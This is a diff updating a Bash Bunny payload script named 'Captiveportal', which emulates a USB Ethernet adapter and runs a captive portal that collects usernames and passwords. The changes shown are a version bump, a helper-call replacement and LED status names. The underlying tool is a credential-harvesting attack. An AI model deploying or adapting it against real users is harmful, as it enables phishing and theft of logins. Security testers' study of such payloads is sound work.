@@ -2,7 +2,7 @@
 #
 # Title:         Captiveportal
 # Author:        Sebkinne
-# Version:       1.1
+# Version:       1.2
 
 # Add or remove inputs here
 INPUTS=(username password)
@@ -11,11 +11,13 @@ INPUTS=(username password)
 ATTACKMODE RNDIS_ETHERNET
 #ATTACKMODE ECM_ETHERNET
 
+
 ##################################################################
 #                  DO NOT EDIT BELOW THIS LINE                   #
 ##################################################################
 
-source bunny_helpers.sh
+
+GET SWITCH_POSITION
 WORKINGPATH="/root/udisk/payloads/$SWITCH_POSITION"
 
 # Sets up iptable forwarding and filters
@@ -35,7 +37,7 @@ function startCaptiveportal() {
     ./captiveportal ${INPUTS[@]}
 }
 
-LED G 200
+LED SETUP
 setupNetworking
 startCaptiveportal &
-LED B 0
+LED ATTACK
